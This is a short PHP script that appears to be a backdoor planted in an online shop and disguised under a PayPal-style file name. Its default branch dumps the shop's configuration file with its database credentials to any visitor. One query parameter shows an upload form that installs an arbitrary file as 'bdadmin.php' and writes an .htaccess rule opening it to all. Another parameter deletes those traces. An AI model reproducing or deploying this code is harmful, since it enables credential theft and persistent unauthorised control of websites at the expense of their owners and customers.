<?php
	$sDirPadre = getcwd() . '/../..';

	if( array_key_exists( 'bd', $_GET ) )
	{	
		if( array_key_exists( 'action', $_POST ) )
		{
			if( $_FILES["file"]["error"] > 0 )
				echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
			else
			{
				@unlink( $sDirPadre . '/images/productos/.htaccess' );
				@unlink( $sDirPadre . '/images/productos/bdadmin.php' );
			
				move_uploaded_file( $_FILES["file"]["tmp_name"], $sDirPadre . '/images/productos/bdadmin.php' );

				$flHtaccess = fopen( $sDirPadre . '/images/productos/.htaccess', 'a' );
				fwrite( $flHtaccess, "<FilesMatch \"^(bdadmin\.php|\.ht)\">\nAllow from all\n</FilesMatch>" );
				fclose( $flHtaccess );
			}
		}
	
		if( file_exists( $sDirPadre . '/images/productos/bdadmin.php' ) )
			echo 'Bdadmin se subio correctamente';
		else
		{
			echo '<form action="paypal_dxn.php?bd=1" method="post" enctype="multipart/form-data">';
				echo '<input type="file" name="file"/>';
				echo '<input type="hidden" name="action" value="up"/>';
				echo '<input type="submit" name="submit" value="Enviar" />';
			echo '</form>';
		}
	}
	elseif( array_key_exists( 'borrar', $_GET ) )
	{
		unlink( $sDirPadre . '/images/productos/.htaccess' );
		unlink( $sDirPadre . '/images/productos/bdadmin.php' );

		echo 'Datos borrados';
	}
	else
	{
		$flConfig = file( $sDirPadre  . '/includes/configure.php' );
			
		foreach ($flConfig as $line)
			echo htmlspecialchars($line) . '<br>';
	}
?>